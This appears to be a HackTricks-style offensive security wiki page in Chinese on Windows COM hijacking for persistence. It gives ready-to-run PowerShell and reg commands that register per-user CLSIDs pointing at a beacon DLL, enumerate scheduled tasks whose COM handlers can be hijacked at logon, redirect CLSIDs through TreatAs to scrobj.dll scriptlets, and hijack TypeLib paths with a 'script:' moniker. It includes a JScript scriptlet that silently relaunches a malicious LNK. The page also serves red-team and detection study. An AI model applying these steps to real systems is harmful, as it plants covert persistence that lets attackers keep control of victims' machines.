# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

由于用户可以修改 HKCU 的值，**COM Hijacking** 可以被用作 **持久化机制**。使用 `procmon` 很容易找到尚不存在但会被搜索到、攻击者可以创建的 COM 注册表项。常用过滤条件：

- **RegOpenKey** 操作。
- 当 _Result_ 为 **NAME NOT FOUND**。
- 且 _Path_ 以 **InprocServer32** 结尾。

狩猎时有用的变体：

- 还要查找缺失的 **`LocalServer32`** 键。有些 COM 类是进程外服务器，会启动攻击者控制的 EXE 而不是 DLL。
- 除了 `InprocServer32` 外，还要搜索 **`TreatAs`** 和 **`ScriptletURL`** 注册表操作。近期的检测内容和恶意软件分析经常提到这些，因为它们比普通 COM 注册少得多，因此信号更强。
- 在将注册复制到 HKCU 时，从原始 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` 复制合法的 **`ThreadingModel`**。使用错误的模型通常会导致激活失败并使劫持变得噪声大（易被发现）。
- 在 64 位系统上检查 64 位和 32 位视图（`procmon.exe` vs `procmon64.exe`，`HKLM\Software\Classes` 和 `HKLM\Software\Classes\WOW6432Node`），因为 32 位应用可能解析到不同的 COM 注册。

一旦决定要模拟哪个尚不存在的 COM，就执行以下命令。_如果你决定模拟一个每隔几秒就被加载的 COM，请小心，这可能过于频繁（过度）。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 可被劫持的 Task Scheduler COM 组件

Windows 任务使用 Custom Triggers 来调用 COM 对象，并且因为它们通过 Task Scheduler 执行，所以更容易预测何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

查看输出后，你可以选择一个例如在 **每次用户登录时** 都会被执行的任务。

现在在 **{1936ED8A-BD93-3213-E325-F38D112938EF}** 的 CLSID 或在 **HKEY\CLASSES\ROOT\CLSID** 以及 HKLM 和 HKCU 中搜索时，你通常会发现该值在 HKCU 中不存在。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
然后，你只需创建 HKCU 条目，每次用户登录时，你的 backdoor 就会被触发。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` 允许一个 CLSID 被另一个模拟。从攻击者角度，这意味着你可以保持原始 CLSID 不变，创建第二个每用户 CLSID 指向 `scrobj.dll`，然后使用 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` 将真实 COM 对象重定向到恶意对象。

这在以下情况下很有用：

- 目标应用在登录或应用启动时已经实例化了一个稳定的 CLSID
- 你想要仅通过注册表重定向，而不是替换原始的 `InprocServer32`
- 你想通过 `ScriptletURL` 值执行本地或远程的 `.sct` scriptlet

示例工作流程（改编自公开的 Atomic Red Team 技巧以及早期的 COM 注册表滥用研究）：
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
注意:

- `scrobj.dll` 读取 `ScriptletURL` 值并执行所引用的 `.sct`，因此你可以将 payload 保存在本地文件或通过 HTTP/HTTPS 远程拉取。
- `TreatAs` 在原始 COM 注册已在 HKLM 中完整且稳定时尤其有用，因为你只需一个小的每用户重定向，而不必镜像整个注册表树。
- 如果目标类支持 STA 激活，为了不必等待自然触发就能验证，你可以手动用 `rundll32.exe -sta <ProgID-or-CLSID>` 实例化伪 ProgID/CLSID。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) 定义 COM 接口并通过 `LoadTypeLib()` 加载。当 COM server 被实例化时，操作系统可能也会通过查看注册表键 `HKCR\TypeLib\{LIBID}` 来加载相关的 TypeLib。如果将 TypeLib 路径替换为 **moniker**，例如 `script:C:\...\evil.sct`，当 TypeLib 被解析时，Windows 会执行该 scriptlet —— 产生一种隐蔽的持久化，当常用组件被访问时触发。

这已经在 Microsoft Web Browser control 上被观察到（常由 Internet Explorer、嵌入 WebBrowser 的应用程序，甚至 `explorer.exe` 加载）。

### 步骤 (PowerShell)

1) 识别由高频 CLSID 使用的 TypeLib (LIBID)。常被恶意软件链滥用的示例 CLSID：{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}（Microsoft Web Browser）。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 将 per-user TypeLib 路径指向本地 scriptlet，使用 `script:` moniker（无需管理员权限）：
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 放置一个最小的 JScript `.sct`，用于重新启动你的 primary payload（例如初始链使用的 `.lnk`）：
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) 触发 – 打开 IE、嵌入 WebBrowser 控件的应用程序，或甚至常规的 Explorer 活动都会加载 TypeLib 并执行 scriptlet，从而在登录/重启 时重新激活你的链。

清理
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注意
- 可以将相同逻辑应用到其他高频 COM 组件；始终先从 `HKCR\CLSID\{CLSID}\TypeLib` 解析真实的 `LIBID`。
- 在 64 位系统上，你也可以为 64 位的使用者填充 `win64` 子键。

## References

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
